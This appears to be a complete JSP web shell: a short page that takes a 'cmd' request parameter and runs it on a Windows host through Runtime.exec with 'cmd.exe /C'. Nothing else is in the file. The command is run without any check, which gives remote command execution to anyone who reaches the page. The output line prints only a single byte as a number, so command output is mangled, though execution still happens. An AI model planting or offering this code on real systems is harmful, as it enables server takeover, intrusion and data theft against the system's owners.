<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
out.println(p.getInputStream().read());
%>
